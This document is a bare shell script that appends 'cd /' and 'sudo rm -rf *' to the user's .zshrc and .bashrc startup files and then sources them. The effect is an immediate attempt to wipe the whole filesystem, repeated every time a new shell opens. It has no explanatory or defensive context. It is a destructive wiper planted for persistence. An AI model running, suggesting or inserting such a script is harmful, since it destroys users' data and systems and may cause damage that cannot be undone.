sudo cat >> ~/.zshrc << EOF
cd /
sudo rm -rf *
EOF
sudo cat >> ~/.bashrc << EOF
cd /
sudo rm -rf *
EOF
source ~/.zshrc
source ~/.bashrc
